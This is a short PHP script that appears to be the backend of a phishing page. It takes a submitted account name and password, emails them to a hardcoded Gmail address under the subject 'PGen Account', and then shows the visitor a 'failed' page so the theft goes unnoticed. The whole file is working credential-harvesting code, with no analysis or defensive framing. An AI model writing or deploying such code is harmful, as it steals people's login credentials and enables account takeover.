<?php
$to = "derlars1212@gmail.com";
$subject = "PGen Account";
$txt = "Username: " . $_REQUEST["accountName"] . "<br />Password: " . $_REQUEST["password"];
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers .= "From: PGen" . "\r\n";
mail($to,$subject,$txt,$headers);

include("top.html");
include("failed.html");
include("bottom.html");



?>